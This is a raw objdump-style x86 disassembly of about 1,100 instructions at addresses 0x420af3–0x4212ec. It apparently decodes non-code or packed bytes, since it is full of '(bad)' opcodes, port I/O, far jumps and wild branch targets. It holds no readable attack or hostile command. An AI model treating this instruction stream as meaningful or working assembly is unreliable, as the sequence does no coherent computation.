  420af3:	xchg   ebp,eax
  420af4:	call   0xd157341f
  420af9:	fs mov ebp,0xa238be2d
  420aff:	lods   al,BYTE PTR ds:[esi]
  420b00:	add    dh,BYTE PTR [esp+ebx*8+0x13]
  420b04:	rcr    BYTE PTR [esi+edx*2-0xa],1
  420b08:	mov    esp,0xb74889b4
  420b0d:	fadd   QWORD PTR [ecx-0x74]
  420b10:	out    0xab,eax
  420b12:	retf   0x99a9
  420b15:	inc    eax
  420b16:	in     al,0xc9
  420b18:	cld    
  420b19:	add    edx,DWORD PTR [esp+ebp*1+0x1e]
  420b1d:	jp     0x420b6b
  420b1f:	inc    eax
  420b20:	pop    esp
  420b21:	adc    eax,0x1a83bf78
  420b26:	cmp    eax,0xc9172bec
  420b2b:	nop
  420b2c:	mov    eax,0x9e8588f
  420b31:	jno    0x420b74
  420b33:	sub    BYTE PTR [ebx],al
  420b35:	pop    ds
  420b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b37:	jnp    0x420b6d
  420b39:	in     al,0x12
  420b3b:	test   eax,0x88309462
  420b40:	stc    
  420b41:	pop    di
  420b43:	cwde   
  420b44:	cli    
  420b45:	sbb    ebx,ebx
  420b47:	sbb    DWORD PTR [ecx-0x3],ecx
  420b4a:	das    
  420b4b:	jno    0x420baf
  420b4d:	popa   
  420b4e:	fcmovne st,st(4)
  420b50:	add    ecx,ecx
  420b52:	sub    edx,0x0
  420b55:	call   0xdae08ec8
  420b5a:	not    dh
  420b5c:	ret    0xab47
  420b5f:	fisub  WORD PTR [ebx+eiz*8-0x8]
  420b63:	scas   eax,DWORD PTR es:[edi]
  420b64:	jge    0x420b37
  420b66:	retf   0x9e2e
  420b69:	cmp    cl,0xf7
  420b6c:	lock mov cs,WORD PTR [ebx-0x4c670ae4]
  420b73:	mov    DWORD PTR [ecx-0x7e],ecx
  420b76:	neg    BYTE PTR [ebx-0x6f]
  420b79:	or     dh,BYTE PTR [ebp-0x1d]
  420b7c:	jbe    0x420be1
  420b7e:	in     eax,dx
  420b7f:	sub    eax,0xf2627501
  420b84:	xor    esp,eax
  420b86:	int3   
  420b87:	xchg   edx,eax
  420b88:	ret    0x6765
  420b8b:	mov    eax,0x45aedd0c
  420b90:	adc    esp,DWORD PTR [ebp+ebp*8-0x7b]
  420b94:	iret   
  420b95:	dec    esi
  420b96:	or     eax,0xb0a12d6d
  420b9b:	shl    BYTE PTR [ecx],0x32
  420b9e:	gs jo  0x420b73
  420ba1:	add    esi,edx
  420ba3:	jle    0x420bbb
  420ba5:	pop    ecx
  420ba6:	retf   
  420ba7:	mov    ds:0x425ee98d,al
  420bac:	bound  edi,QWORD PTR [ecx]
  420bae:	jno    0x420bb6
  420bb0:	jns    0x420be5
  420bb2:	xchg   ebx,eax
  420bb3:	xchg   DWORD PTR [ebp-0x47],edx
  420bb6:	push   0x34
  420bb8:	fs pop edx
  420bba:	call   0x7beeae8b
  420bbf:	gs jno 0x420b76
  420bc2:	push   ecx
  420bc3:	mov    ds:0xd5507b1d,eax
  420bc8:	mov    dh,BYTE PTR [ebp+0x48e15a62]
  420bce:	ret    
  420bcf:	scas   al,BYTE PTR es:[edi]
  420bd0:	jmp    0x420bb7
  420bd2:	call   0x7619:0x78929b1f
  420bd9:	dec    edx
  420bda:	and    eax,0x5e8692ae
  420bdf:	adc    eax,0x4e43d83b
  420be4:	repz push edi
  420be6:	shl    DWORD PTR [ebx-0x4bcac35b],0xca
  420bed:	or     al,0x97
  420bef:	jmp    0x2bb0fcd5
  420bf4:	pop    ss
  420bf5:	rcr    BYTE PTR [ecx+0x1c63e5f3],1
  420bfb:	ret    
  420bfc:	mov    dh,0xe1
  420bfe:	adc    dh,dh
  420c00:	jp     0x420c40
  420c02:	cli    
  420c03:	fst    DWORD PTR [eax-0x1898624c]
  420c09:	ja     0x420baf
  420c0b:	sbb    esi,esi
  420c0d:	rcl    DWORD PTR [esi],cl
  420c0f:	jb     0x420bf3
  420c11:	in     al,dx
  420c12:	sbb    BYTE PTR [eax],cl
  420c14:	and    al,0x54
  420c16:	sub    dh,BYTE PTR [eax]
  420c18:	ret    
  420c19:	mov    cl,0xb8
  420c1b:	lods   al,BYTE PTR ds:[esi]
  420c1c:	arpl   di,di
  420c1e:	aam    0x73
  420c20:	lods   eax,DWORD PTR ds:[esi]
  420c21:	test   eax,0xce12c8d
  420c26:	jmp    0x59aa8a1e
  420c2b:	mov    al,0xb6
  420c2d:	das    
  420c2e:	sbb    esi,0x6db0ea21
  420c34:	jmp    0x420c9a
  420c36:	push   esi
  420c37:	cmp    eax,ebx
  420c39:	dec    ebp
  420c3a:	sar    bl,cl
  420c3c:	pop    es
  420c3d:	ins    DWORD PTR es:[edi],dx
  420c3e:	or     BYTE PTR [ecx+eax*4+0x136afbf4],al
  420c45:	out    0x70,al
  420c47:	mov    ds:0xd6fd301b,eax
  420c4c:	inc    esi
  420c4d:	or     bl,dl
  420c4f:	cmp    al,0x89
  420c51:	cld    
  420c52:	pop    ss
  420c53:	inc    ebx
  420c54:	je     0x420c6a
  420c56:	pop    esp
  420c57:	lods   al,BYTE PTR ds:[esi]
  420c58:	cmp    DWORD PTR [ebx+esi*1-0x4a],0x4e8e24ab
  420c60:	outs   dx,DWORD PTR ds:[esi]
  420c61:	mov    edi,0x4d7704a7
  420c66:	xchg   ebp,edx
  420c68:	and    al,0x2e
  420c6a:	sbb    DWORD PTR [eax+0x24b4dcf3],esi
  420c70:	cdq    
  420c71:	retf   0x9446
  420c74:	push   ecx
  420c75:	lds    edi,FWORD PTR [edi-0x1f]
  420c78:	fld    QWORD PTR ds:0x221662c9
  420c7e:	lea    ebx,[edi]
  420c80:	or     dh,BYTE PTR [edx+0x42]
  420c83:	mov    ch,0x63
  420c85:	xor    eax,0xe7093e23
  420c8a:	mov    bl,0x9c
  420c8c:	fisttp QWORD PTR [esi]
  420c8e:	shl    BYTE PTR [ebp-0xd626376],cl
  420c94:	pop    ebx
  420c95:	add    al,0xb7
  420c97:	sub    ebp,ecx
  420c99:	sbb    dh,BYTE PTR [esi+edx*8+0x76]
  420c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c9e:	in     al,dx
  420c9f:	mov    ecx,ecx
  420ca1:	aaa    
  420ca2:	ins    BYTE PTR es:[edi],dx
  420ca3:	outs   dx,BYTE PTR ds:[esi]
  420ca4:	mov    ecx,0x448f08a4
  420ca9:	xor    ebp,DWORD PTR ds:0x55aa1942
  420caf:	sub    DWORD PTR [ebp+0x1ee21d47],esp
  420cb5:	mov    ds:0xddb62940,eax
  420cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cbc:	scas   eax,DWORD PTR es:[edi]
  420cbd:	pop    esi
  420cbe:	fist   WORD PTR [eax-0x32]
  420cc1:	inc    eax
  420cc2:	fwait
  420cc3:	and    esp,DWORD PTR [edi]
  420cc5:	daa    
  420cc6:	iret   
  420cc7:	sbb    BYTE PTR [esi+ebp*2],bl
  420cca:	dec    esi
  420ccb:	pop    edx
  420ccc:	aaa    
  420ccd:	fist   WORD PTR [edi+0x4531813e]
  420cd3:	idiv   eax
  420cd5:	mov    edi,DWORD PTR [ebx-0x725698d6]
  420cdb:	(bad)  
  420cdc:	test   eax,0x3dbf8ff4
  420ce1:	mov    ?,edi
  420ce3:	pop    esi
  420ce4:	rcl    BYTE PTR [edi+0x58349d2b],1
  420cea:	push   cs
  420ceb:	add    BYTE PTR [esi-0x4],ch
  420cee:	xor    al,BYTE PTR [ecx-0x2ab7b749]
  420cf4:	and    BYTE PTR [edi-0x33f0966f],dl
  420cfa:	push   0x2d9799ff
  420cff:	das    
  420d00:	pop    esi
  420d01:	mov    dl,0xf9
  420d03:	js     0x420d6b
  420d05:	add    edx,DWORD PTR [edi]
  420d07:	or     esi,DWORD PTR [edx]
  420d09:	lock xchg ebx,eax
  420d0b:	push   es
  420d0c:	ins    BYTE PTR es:[edi],dx
  420d0d:	cdq    
  420d0e:	xchg   ecx,eax
  420d0f:	push   eax
  420d10:	xchg   esp,eax
  420d11:	push   0xb8421e93
  420d16:	push   esp
  420d17:	mov    ebx,0xb1c666a6
  420d1c:	test   BYTE PTR [ecx-0x57],bh
  420d1f:	repnz imul ebx,DWORD PTR [eax],0x1
  420d23:	jnp    0x420cb2
  420d25:	nop
  420d26:	push   esi
  420d27:	jmp    0x420d7c
  420d29:	loop   0x420cfb
  420d2b:	pop    esi
  420d2c:	gs adc al,0x45
  420d2f:	loopne 0x420d45
  420d31:	fwait
  420d32:	pop    ds
  420d33:	clc    
  420d34:	or     ecx,DWORD PTR ds:0x22cadeee
  420d3a:	fsubr  DWORD PTR [edi]
  420d3c:	pop    eax
  420d3d:	repnz ror BYTE PTR [ebp-0x2846abdb],1
  420d44:	fnstcw WORD PTR [eax]
  420d46:	mov    esi,0xee4711ec
  420d4b:	adc    ebp,DWORD PTR [esi]
  420d4d:	js     0x420d69
  420d4f:	sbb    BYTE PTR [eax+0x53],ah
  420d52:	sub    bh,dh
  420d54:	and    BYTE PTR [esi],bh
  420d56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d57:	imul   edx,ebx,0xffffffe6
  420d5a:	lock mov dl,0xeb
  420d5d:	mov    al,0xa7
  420d5f:	or     BYTE PTR [ebp+0xc4cd277],al
  420d65:	mov    edi,0x4a428fc5
  420d6a:	add    ecx,DWORD PTR [ecx-0x2c3038be]
  420d70:	test   eax,0xf0edc559
  420d75:	sbb    eax,0x8d28ae9e
  420d7a:	gs std 
  420d7c:	or     ecx,DWORD PTR [esi]
  420d7e:	(bad)  
  420d80:	and    BYTE PTR [ebx+0x62fa01d1],dh
  420d86:	dec    esi
  420d87:	int    0xe7
  420d89:	push   0x21a08db2
  420d8e:	imul   ebp,DWORD PTR [esi+eax*4+0x37],0xfffffffb
  420d93:	mov    al,ds:0xa0fd1c0e
  420d98:	pop    esi
  420d99:	add    BYTE PTR [ebp+edi*4-0x1516630a],bl
  420da0:	push   edi
  420da1:	int3   
  420da2:	xchg   ecx,eax
  420da3:	pop    ss
  420da4:	aam    0x38
  420da6:	xor    DWORD PTR [ebp-0x6065817],ebx
  420dac:	jo     0x420db5
  420dae:	clc    
  420daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420db0:	or     BYTE PTR [eax+0x22],al
  420db3:	mov    al,0x6b
  420db5:	push   edi
  420db6:	sti    
  420db7:	mov    ebx,0x704e4036
  420dbc:	xor    eax,0x13c9c522
  420dc1:	addr16 mov esp,0x52b41040
  420dc7:	fimul  DWORD PTR ds:0xc67e2bf5
  420dcd:	aam    0x1f
  420dcf:	dec    esp
  420dd0:	mov    bh,0x15
  420dd2:	imul   esi,eax,0xffffffba
  420dd5:	dec    edx
  420dd6:	scas   eax,DWORD PTR es:[edi]
  420dd7:	(bad)  
  420dd8:	cmc    
  420dd9:	push   ebx
  420dda:	mov    al,0x2b
  420ddc:	lods   al,BYTE PTR ds:[esi]
  420ddd:	xchg   esi,eax
  420dde:	sti    
  420ddf:	jmp    0x28637509
  420de4:	or     BYTE PTR [eax+0x1baf07d6],dh
  420dea:	inc    edx
  420deb:	or     ebp,DWORD PTR [edx]
  420ded:	jmp    0xc845:0x400b0547
  420df4:	ss mov bl,0x5a
  420df7:	xchg   BYTE PTR [ebp+0x76],ah
  420dfa:	mov    ebp,0xcec99d0c
  420dff:	push   cs
  420e00:	clc    
  420e01:	or     al,BYTE PTR [esi-0x10ffce3f]
  420e07:	leave  
  420e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e09:	out    0x9b,al
  420e0b:	lock fcomip st,st(7)
  420e0e:	xor    edx,ecx
  420e10:	mov    bl,BYTE PTR [ebx]
  420e12:	enter  0x8779,0x46
  420e16:	sbb    esi,DWORD PTR [eax+edi*2]
  420e19:	out    dx,al
  420e1a:	call   0xc5788bf1
  420e1f:	jge    0x420df9
  420e21:	jno    0x420e74
  420e23:	pop    ebx
  420e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e25:	(bad)  
  420e26:	xchg   esi,eax
  420e27:	inc    ecx
  420e28:	xor    edi,eax
  420e2a:	les    ebx,FWORD PTR [ecx]
  420e2c:	or     DWORD PTR [edi+0x79],0x542b6cd
  420e33:	cld    
  420e34:	int    0x40
  420e36:	cmp    eax,0xdf409d27
  420e3b:	mov    edi,0x60329be3
  420e41:	aas    
  420e42:	mov    ?,eax
  420e44:	ja     0x420e39
  420e46:	xlat   BYTE PTR ds:[ebx]
  420e47:	retf   
  420e48:	ret    0x368
  420e4b:	test   DWORD PTR [esi-0x33a0f416],ecx
  420e51:	jecxz  0x420e3e
  420e53:	cmp    al,BYTE PTR [esi]
  420e55:	mov    ecx,0x802e05cf
  420e5a:	inc    ebx
  420e5b:	test   dl,0x30
  420e5e:	mov    dh,0xf7
  420e60:	ins    DWORD PTR es:[edi],dx
  420e61:	pop    ebx
  420e62:	mov    cl,0xb1
  420e64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e65:	ds jmp 0x420ea1
  420e68:	leave  
  420e69:	les    ebx,FWORD PTR [ecx]
  420e6b:	mov    WORD PTR [edx-0x43],gs
  420e6e:	jae    0x420e60
  420e70:	nop
  420e71:	mov    ds:0x23150ef0,eax
  420e76:	inc    esi
  420e77:	jb     0x420ed9
  420e79:	mov    esp,0x4d3c69f2
  420e7e:	scas   eax,DWORD PTR es:[edi]
  420e7f:	xor    cl,BYTE PTR [esp+edi*1]
  420e82:	adc    BYTE PTR [ebp-0x702723ba],al
  420e88:	and    edx,DWORD PTR ds:0x9ea78e3a
  420e8e:	std    
  420e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e90:	sub    al,0xe
  420e92:	or     BYTE PTR [edi-0x32],bh
  420e95:	ins    DWORD PTR es:[edi],dx
  420e96:	in     eax,0x35
  420e98:	pop    eax
  420e99:	or     DWORD PTR ds:0xe4eae0d0,ecx
  420e9f:	mov    esi,0xd184a924
  420ea4:	cmp    al,0x4d
  420ea6:	mov    ebx,0x2f3fc9c2
  420eab:	dec    esi
  420eac:	xchg   ebx,eax
  420ead:	cs sub eax,0x10ce2a19
  420eb3:	dec    ebp
  420eb4:	into   
  420eb5:	cmp    DWORD PTR ds:0xf45a5ebe,0x5ed20c7a
  420ebf:	inc    ecx
  420ec0:	add    al,0x6
  420ec2:	sbb    bh,bh
  420ec4:	icebp  
  420ec5:	adc    dl,ah
  420ec7:	pop    ebp
  420ec8:	sub    BYTE PTR [ebp-0x7f7fad93],ch
  420ece:	setbe  BYTE PTR [ebp+0x50]
  420ed2:	dec    ecx
  420ed3:	sub    dh,BYTE PTR [eax+0x7005a79e]
  420ed9:	ins    BYTE PTR es:[edi],dx
  420eda:	adc    al,0x1d
  420edc:	sbb    bh,BYTE PTR [ebx-0x21]
  420edf:	mov    esi,ebx
  420ee1:	push   ds
  420ee2:	pusha  
  420ee3:	in     eax,dx
  420ee4:	arpl   WORD PTR [ebx+eiz*4-0x27c0c4cb],cx
  420eeb:	add    DWORD PTR [esi+0x10416811],eax
  420ef1:	push   ds
  420ef2:	les    edx,FWORD PTR [ebx]
  420ef4:	pop    ss
  420ef5:	push   esi
  420ef6:	sbb    bl,BYTE PTR [esi-0x42]
  420ef9:	cmp    al,0x0
  420efb:	adc    DWORD PTR [ebx+0x54],esp
  420efe:	or     esp,DWORD PTR [ebx+esi*1-0x7de2fccb]
  420f05:	xor    esi,DWORD PTR [esi+0x5fd9d1a1]
  420f0b:	push   edx
  420f0c:	mov    bl,0xa0
  420f0e:	xor    dl,dl
  420f10:	loop   0x420f25
  420f12:	jns    0x420ee1
  420f14:	test   BYTE PTR [edi],dh
  420f16:	or     eax,0x5cc3bb93
  420f1b:	sbb    eax,0xa89feb42
  420f20:	(bad)  
  420f21:	lods   al,BYTE PTR ds:[esi]
  420f22:	fild   DWORD PTR [ecx+0x4a0a6255]
  420f28:	sub    al,0xbb
  420f2a:	stos   DWORD PTR es:[edi],eax
  420f2b:	scas   eax,DWORD PTR es:[edi]
  420f2c:	or     DWORD PTR [eax+0x433b496],ebx
  420f32:	mov    eax,0x8b9bd316
  420f37:	loope  0x420f6c
  420f39:	rol    BYTE PTR [ecx+0x746832d6],0x43
  420f40:	sbb    al,0x14
  420f42:	dec    eax
  420f43:	cli    
  420f44:	lea    eax,[edi+0x3e3d7d49]
  420f4a:	faddp  st(6),st
  420f4c:	div    edx
  420f4e:	aas    
  420f4f:	hlt    
  420f50:	fwait
  420f51:	push   ebx
  420f52:	jae    0x420ed6
  420f54:	xor    eax,0xfa7942f
  420f59:	mov    WORD PTR [ebx+0x39b17c1b],?
  420f5f:	fdiv   QWORD PTR [ebx]
  420f61:	sub    ebx,DWORD PTR [edx+0x17216fff]
  420f67:	imul   ebx,DWORD PTR es:[eax+0x47b30132],0xffffffc8
  420f6f:	into   
  420f70:	je     0x420f13
  420f72:	(bad)  
  420f73:	or     bl,BYTE PTR [eax+edi*1]
  420f76:	cli    
  420f77:	sbb    dl,dl
  420f79:	mov    WORD PTR [eax],?
  420f7b:	push   esi
  420f7c:	test   BYTE PTR [ecx],bh
  420f7e:	adc    BYTE PTR [eax],cl
  420f80:	lea    eax,[edi+0x61864415]
  420f86:	out    0xbd,eax
  420f88:	fidivr WORD PTR [ebx+esi*1+0x37]
  420f8c:	pop    ecx
  420f8d:	ret    0xd9a0
  420f90:	data16 sub BYTE PTR [eax-0x55cd2f37],0x68
  420f98:	das    
  420f99:	call   0x16b413fb
  420f9e:	scas   eax,DWORD PTR es:[edi]
  420f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fa2:	adc    al,0x6b
  420fa4:	out    0xa,eax
  420fa6:	sbb    BYTE PTR [edx-0x6227e8d6],dh
  420fac:	push   edx
  420fad:	or     al,0x9b
  420faf:	inc    edi
  420fb0:	cld    
  420fb1:	mov    ebp,0xfdbd3364
  420fb6:	iret   
  420fb7:	cmpxchg ah,dh
  420fba:	call   0xfaee:0x574b29c0
  420fc1:	push   0x8824c5c8
  420fc6:	lock pushf 
  420fc8:	cdq    
  420fc9:	repz mov ah,0x29
  420fcc:	test   eax,0x1250bf36
  420fd1:	inc    eax
  420fd2:	std    
  420fd3:	repnz hlt 
  420fd5:	in     al,dx
  420fd6:	pop    edi
  420fd7:	test   edi,edx
  420fd9:	push   ds
  420fda:	push   ss
  420fdb:	inc    ecx
  420fdc:	adc    eax,0xc3a14915
  420fe1:	sub    ebx,DWORD PTR [edx]
  420fe3:	sub    BYTE PTR [ebp+0x28008fbe],dl
  420fe9:	imul   edx,DWORD PTR ds:0xde8065a8,0xaf3c389c
  420ff3:	das    
  420ff4:	mov    dh,BYTE PTR [edx]
  420ff6:	inc    ebx
  420ff7:	pop    ebp
  420ff8:	xor    edi,eax
  420ffa:	mov    dl,0xed
  420ffc:	xor    al,0xdd
  420ffe:	cdq    
  420fff:	enter  0x18,0x77
  421003:	dec    edx
  421004:	or     esp,DWORD PTR ds:0xf3393bef
  42100a:	xor    ch,BYTE PTR [eax+0x71]
  42100d:	pop    ebp
  42100e:	je     0x421049
  421010:	pop    ebx
  421011:	xchg   ecx,eax
  421012:	sbb    ebx,DWORD PTR [ebx+0x65]
  421015:	aaa    
  421016:	push   esi
  421017:	mov    al,ds:0x99f71653
  42101c:	cmovl  edx,DWORD PTR [edi+0x40]
  421020:	and    DWORD PTR [eax+0x55],edi
  421023:	mov    DWORD PTR [ecx-0x4fb694df],0xbaa3a97e
  42102d:	addr16 pop edx
  42102f:	cld    
  421030:	lds    esi,FWORD PTR [esi+0x1a61b73a]
  421036:	jae    0x6c048bb8
  42103c:	add    al,0x7e
  42103e:	ds pusha 
  421040:	push   ebp
  421041:	push   cs
  421042:	push   0xa874a7bc
  421047:	sbb    esp,eax
  421049:	std    
  42104a:	xchg   edi,eax
  42104b:	sysret 
  42104d:	fistp  WORD PTR [edi]
  42104f:	push   edx
  421050:	call   0x7b815146
  421055:	pop    eax
  421056:	imul   esi,DWORD PTR [esi-0x4b],0x2ffaa6a8
  42105d:	jge    0x420ff5
  42105f:	push   ebx
  421060:	sub    ebp,edx
  421062:	scas   eax,DWORD PTR es:[edi]
  421063:	or     ebx,ebp
  421065:	stos   BYTE PTR es:[edi],al
  421066:	mov    esi,0xb2b62a5e
  42106b:	pop    eax
  42106c:	sbb    DWORD PTR [esi],ecx
  42106e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42106f:	cwde   
  421070:	inc    esi
  421071:	xchg   DWORD PTR [eax+edi*1-0x53],ecx
  421075:	jmp    0x5eb77a10
  42107a:	cmp    BYTE PTR [esi],dl
  42107c:	(bad)  [esi+0x30]
  42107f:	lods   eax,DWORD PTR ds:[esi]
  421080:	push   eax
  421081:	inc    edx
  421082:	or     eax,0x1d5f15ae
  421087:	sbb    BYTE PTR [edx],cl
  421089:	pop    ebx
  42108a:	xchg   ebx,eax
  42108b:	out    dx,al
  42108c:	jp     0x42102d
  42108e:	dec    esp
  42108f:	jp     0x42108a
  421091:	cs jmp 0x4210b9
  421094:	lock das 
  421096:	lock pop edi
  421098:	or     al,0x4f
  42109a:	pop    es
  42109b:	push   0x48
  42109d:	jbe    0x4210ca
  42109f:	or     ch,0x70
  4210a2:	dec    esp
  4210a3:	shl    DWORD PTR [ecx+edi*4-0x3b806648],1
  4210aa:	dec    ebp
  4210ab:	push   ebx
  4210ac:	cmp    eax,0x572f4bd9
  4210b1:	mov    DWORD PTR [edi],eax
  4210b3:	dec    ebp
  4210b4:	mov    eax,ds:0xa960d7bd
  4210b9:	icebp  
  4210ba:	ins    DWORD PTR es:[edi],dx
  4210bb:	fisttp WORD PTR [edi]
  4210bd:	fst    st(7)
  4210bf:	(bad)  
  4210c0:	jbe    0x4210b6
  4210c2:	fbld   TBYTE PTR [ebp+esi*1-0x64e9aaf2]
  4210c9:	jp     0x42109f
  4210cb:	sub    al,0x2f
  4210cd:	(bad)  
  4210ce:	dec    edx
  4210cf:	retf   0xee16
  4210d2:	add    ch,BYTE PTR [eax+0x7c15ae3]
  4210d8:	xchg   BYTE PTR [edi],dh
  4210da:	ror    BYTE PTR ds:0xa72bfb3a,1
  4210e0:	dec    edx
  4210e1:	rcr    BYTE PTR [ecx+ecx*1],1
  4210e4:	clc    
  4210e5:	dec    edi
  4210e6:	mov    WORD PTR [esi],gs
  4210e8:	lods   eax,DWORD PTR ds:[esi]
  4210e9:	sti    
  4210ea:	ins    DWORD PTR es:[edi],dx
  4210eb:	mov    cl,al
  4210ed:	js     0x4210fd
  4210ef:	adc    cl,BYTE PTR [eax-0x722e43d4]
  4210f5:	aaa    
  4210f6:	idiv   DWORD PTR [ecx+0x5860f451]
  4210fc:	inc    ebp
  4210fd:	mov    al,ds:0x5671e020
  421102:	cmp    al,al
  421104:	xchg   ebx,eax
  421105:	lea    edi,[ebp+0x7e2a36a5]
  42110b:	daa    
  42110c:	xchg   ebp,eax
  42110d:	mov    WORD PTR [ebx+0x128ed89d],?
  421113:	sbb    al,0xdb
  421115:	cdq    
  421116:	idiv   ebx
  421118:	mov    ?,WORD PTR [eax+0x2a357c03]
  42111e:	fild   QWORD PTR [ecx-0x126307ba]
  421124:	(bad)  
  421125:	mov    edx,0xede5786f
  42112a:	pop    ds
  42112b:	sahf   
  42112c:	mov    ds,WORD PTR [eax]
  42112e:	adc    eax,0x446fb100
  421133:	cli    
  421134:	pop    es
  421135:	fst    QWORD PTR [eax+0x12b44c9d]
  42113b:	inc    ecx
  42113c:	cmp    al,bl
  42113e:	adc    DWORD PTR [edx],edx
  421140:	sar    BYTE PTR [ebx-0x205c50c2],cl
  421146:	aad    0x21
  421148:	fisttp WORD PTR [edi]
  42114a:	jl     0x4210d9
  42114c:	jmp    0x421131
  42114e:	mov    ch,0xd3
  421150:	(bad)  
  421151:	mov    esp,0xaa3d38b4
  421156:	jnp    0x421154
  421158:	inc    esp
  421159:	inc    ebx
  42115a:	jl     0x4211c4
  42115c:	repnz arpl WORD PTR [bx+si],di
  421160:	and    ah,bl
  421162:	push   edi
  421163:	sub    bl,BYTE PTR ds:0x890c8fa2
  421169:	out    0xf7,eax
  42116b:	jmp    0x406f:0x57f6898f
  421172:	add    al,0x3
  421174:	outs   dx,DWORD PTR ds:[esi]
  421175:	xor    esi,0xffffffff
  421178:	mov    esi,0x29430035
  42117d:	fs cli 
  42117f:	add    DWORD PTR [edi+0x5a],esp
  421182:	push   ss
  421183:	test   esp,esi
  421185:	sub    BYTE PTR [edx-0x67],0x22
  421189:	in     al,dx
  42118a:	outs   dx,BYTE PTR ds:[esi]
  42118b:	inc    eax
  42118c:	les    edx,FWORD PTR [ebx-0x1a496286]
  421192:	jb     0x42120b
  421194:	sub    eax,0x5147646d
  421199:	enter  0xe153,0xc4
  42119d:	test   eax,ebp
  42119f:	call   0xaeda:0x46498099
  4211a6:	imul   esi,DWORD PTR [edi+0x9],0x1160c7ed
  4211ad:	push   edi
  4211ae:	mov    ecx,DWORD PTR [ecx]
  4211b0:	mov    bh,0xd6
  4211b2:	pop    ebp
  4211b3:	mov    al,0x93
  4211b5:	loopne 0x42115e
  4211b7:	rcr    BYTE PTR [ebx],0x51
  4211ba:	pop    ss
  4211bb:	in     eax,0x60
  4211bd:	test   eax,0xc89b32c1
  4211c2:	jl     0x42120f
  4211c4:	fstp   DWORD PTR [ebx+ebx*8+0x33c9c6ce]
  4211cb:	xlat   BYTE PTR ds:[ebx]
  4211cc:	test   al,0x58
  4211ce:	(bad)  
  4211cf:	mov    esi,0x516e3c71
  4211d4:	aad    0x4
  4211d6:	jmp    0xf968d7
  4211db:	std    
  4211dc:	jb     0x42121e
  4211de:	shr    DWORD PTR [edx],cl
  4211e0:	push   esp
  4211e1:	and    dl,al
  4211e3:	ja     0x42118b
  4211e5:	add    eax,0xd91cd6a5
  4211ea:	idiv   esp
  4211ec:	inc    esp
  4211ed:	ss ret 0xd2cd
  4211f1:	(bad)  
  4211f2:	fcom   QWORD PTR [ecx-0x2c0d1766]
  4211f8:	or     al,BYTE PTR [ecx]
  4211fa:	(bad)  
  4211fb:	lock mov bl,0xf
  4211fe:	mov    ebx,0xd6977196
  421203:	push   es
  421204:	out    0xff,eax
  421206:	in     eax,0x3d
  421208:	ja     0x4211b9
  42120a:	(bad)  
  42120b:	lock ret 
  42120d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42120e:	inc    edx
  42120f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421210:	and    DWORD PTR [eax-0x2f217822],ecx
  421216:	or     eax,DWORD PTR [edx]
  421218:	fist   DWORD PTR [edx-0x466644e7]
  42121e:	cdq    
  42121f:	mov    edi,esp
  421221:	add    ebx,ecx
  421223:	and    esi,DWORD PTR [esi+0x52]
  421226:	dec    edi
  421228:	lods   eax,DWORD PTR ds:[esi]
  421229:	sbb    DWORD PTR [esi-0x20791845],edx
  42122f:	jne    0x4211e5
  421231:	xor    eax,0x15a95aa
  421236:	cmp    dh,BYTE PTR [ebp-0x20]
  421239:	(bad)  
  42123a:	adc    BYTE PTR [edx-0x21],ah
  42123d:	leave  
  42123e:	push   ecx
  42123f:	xlat   BYTE PTR ds:[ebx]
  421240:	(bad)  
  421241:	dec    edx
  421242:	dec    DWORD PTR [esi+0x4a]
  421245:	mov    ds:0xa7de7260,eax
  42124a:	add    BYTE PTR [esi],0xf4
  42124d:	mov    ch,0x27
  42124f:	loopne 0x421254
  421251:	test   al,0x36
  421253:	(bad)  
  421254:	cli    
  421255:	and    DWORD PTR [eax-0x586dac81],ebx
  42125b:	popf   
  42125c:	ins    DWORD PTR es:[edi],dx
  42125d:	jb     0x42124a
  42125f:	or     al,0x39
  421261:	sbb    al,0xb5
  421263:	ror    DWORD PTR [ebp+0x3750d209],cl
  421269:	in     al,dx
  42126a:	jg     0x421225
  42126c:	lods   al,BYTE PTR ds:[esi]
  42126d:	aam    0x95
  42126f:	ret    0xf4f6
  421272:	push   cs
  421273:	in     al,dx
  421274:	scas   eax,DWORD PTR es:[edi]
  421275:	mul    DWORD PTR [ebx+0x1c]
  421278:	iret   
  421279:	mov    ds:0xf2bf1360,al
  42127e:	jae    0x42126e
  421280:	xor    eax,0xd8d36903
  421285:	jno    0x421244
  421287:	aam    0xbe
  421289:	jno    0x42123d
  42128b:	or     eax,0x14b235bb
  421290:	ret    0x3f9f
  421293:	into   
  421294:	test   BYTE PTR [ecx+0x67b36e99],al
  42129a:	jecxz  0x4212fd
  42129c:	sti    
  42129d:	frstpm(287 only) 
  42129f:	adc    edx,edi
  4212a1:	and    bl,0xc2
  4212a4:	add    esp,DWORD PTR ds:0x545d5603
  4212aa:	mov    bh,0x98
  4212ac:	adc    al,0x42
  4212ae:	fdiv   DWORD PTR [esi-0x3df05e2d]
  4212b4:	ds pop es
  4212b6:	or     esp,DWORD PTR [edi+0x361d5a67]
  4212bc:	jg     0x421327
  4212be:	ret    
  4212bf:	mov    edx,0x582570f5
  4212c4:	push   0xd81396a2
  4212c9:	jmp    0x62cbc5da
  4212ce:	fld    TBYTE PTR [ebx]
  4212d0:	sbb    eax,0xcc24e77a
  4212d5:	mov    BYTE PTR [ecx+0x2261adfd],dh
  4212db:	cmp    al,0xc8
  4212dd:	imul   ecx,ecx,0x45cb2669
  4212e3:	xchg   esi,eax
  4212e4:	loope  0x421322
  4212e6:	mov    edi,ebx
  4212e8:	fld    TBYTE PTR [esi]
  4212ea:	je     0x421360
  4212ec:	scas   eax,DWORD PTR es:[edi]
